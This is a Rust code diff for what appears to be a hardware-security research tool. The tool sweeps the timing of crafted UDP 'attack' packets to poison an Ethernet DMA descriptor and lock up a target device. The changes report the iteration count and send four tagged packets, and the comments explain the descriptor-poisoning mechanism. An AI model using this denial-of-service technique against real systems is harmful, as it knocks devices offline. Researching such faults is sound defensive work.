@@ -134,8 +134,8 @@ fn main() -> Result<()> {
             if end <= start {
                 bail!("end must be greater than start");
             }
-            let delay = worker.run_delay_sweep(start, end)?;
-            println!("{delay}");
+            let (delay, i) = worker.run_delay_sweep(start, end)?;
+            println!("locked up system with {delay} after {i} iterations");
         }
         Command::One { delay } => {
             worker.run_one(delay)?;
@@ -177,7 +177,11 @@ impl Worker {
         self.receive_udp(Duration::from_millis(100)).is_some()
     }
 
-    fn run_delay_sweep(&mut self, start: i64, end: i64) -> Result<i64> {
+    fn run_delay_sweep(
+        &mut self,
+        start: i64,
+        end: i64,
+    ) -> Result<(i64, usize)> {
         for n in 0.. {
             info!("beginning iteration {n}");
             for i in start..end {
@@ -190,7 +194,7 @@ impl Worker {
                 std::thread::sleep(Duration::from_millis(10));
                 if !self.check_alive() {
                     info!("killed with delay {i}");
-                    return Ok(i);
+                    return Ok((i, n));
                 }
             }
         }
@@ -222,13 +226,14 @@ impl Worker {
         // because that determines how long the DMA peripheral takes to copy it.
         //
         // We use a characteristic string so that we can find it in RAM.
-        let attack_packet = {
-            let mut data: Vec<u8> = b"attack-".to_vec();
+        let mut attack_packets = vec![];
+        for i in 0..4 {
+            let mut data: Vec<u8> = format!("attack-{i}-").as_bytes().to_vec();
             for i in 0..16 {
                 data.push(b'1' + i % 10);
             }
-            self.udp_packet(&data)
-        };
+            attack_packets.push(self.udp_packet(&data));
+        }
 
         trace!("sending attack sequence with delay {delay_micros}");
 
@@ -330,17 +335,19 @@ impl Worker {
         //
         // This means that we can tell our critical timing by examining when we
         // start seeing "suspended" readings in our 6-packet burst.
-        self.sender.send_to(attack_packet.packet(), None);
 
-        // If we successfully poisoned the descriptor, then the DMA peripheral is
-        // waiting to write to address 0x301, which is invalid.  Any further
-        // communication will fail.
-        //
-        // However, as the system continues processing user packets, it appears
-        // that the DMA peripheral will re-read the descriptor when we next poke
-        // the tail pointer.  This means that we have to send a second packet
-        // right away, while the descriptor is poisoned.
-        self.sender.send_to(attack_packet.packet(), None);
+        for a in attack_packets {
+            // If we successfully poisoned the descriptor, then the DMA
+            // peripheral is waiting to write to address 0x301, which is
+            // invalid.  Any further communication will fail.
+            //
+            // However, as the system continues processing user packets, it
+            // appears that the DMA peripheral will re-read the descriptor when
+            // we next poke the tail pointer (?).  This means that we have to
+            // send a second packet right away, while the descriptor is poisoned
+            // (??).
+            self.sender.send_to(a.packet(), None);
+        }
 
         // Receive the initial reply
         if let Some((reply, _reply_time)) =
